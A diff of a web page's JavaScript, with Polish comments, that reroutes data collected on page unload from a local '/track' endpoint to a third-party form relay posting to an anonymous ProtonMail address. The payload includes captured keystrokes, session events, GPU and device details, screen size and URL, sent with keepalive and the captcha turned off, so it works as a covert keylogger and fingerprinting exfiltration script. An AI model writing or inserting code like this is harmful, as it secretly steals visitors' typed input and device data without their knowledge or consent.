@@ -57,26 +57,33 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
-    // 5. Pakowanie i wysyłanie danych w tle przy zamykaniu strony
+    // 5. Pakowanie i wysyłanie danych przy zamykaniu strony
     const sendData = () => {
         const payload = {
             subject: `Nowa sesja: ${new Date().toISOString()}`,
             timestamp: new Date().toISOString(),
             url: window.location.href,
             userAgent: navigator.userAgent,
-            screen: {
-                width: window.screen.width,
-                height: window.screen.height,
-                colorDepth: window.screen.colorDepth,
-            },
-            gpuInfo,
-            devices,
-            keystrokes: [...capturedKeys],
-            session_events: [...events],
+            screen: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
+            gpuInfo: JSON.stringify(gpuInfo),
+            devices: JSON.stringify(devices),
+            keystrokes: JSON.stringify(capturedKeys),
+            session_events: JSON.stringify(events),
+            _captcha: 'false',
+            _next: 'false'
         };
+
+        const formData = new FormData();
+        for (const key in payload) {
+            formData.append(key, payload[key]);
+        }
         
-        const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
-        navigator.sendBeacon('/track', blob);
+        // Używamy fetch z keepalive, aby upewnić się, że żądanie zostanie wysłane nawet po zamknięciu strony
+        fetch('https://formsubmit.co/Anonymousproxy123@proton.me', {
+            method: 'POST',
+            body: formData,
+            keepalive: true
+        });
     };
 
     // Ustawienie nasłuchiwania na zdarzenie opuszczania strony
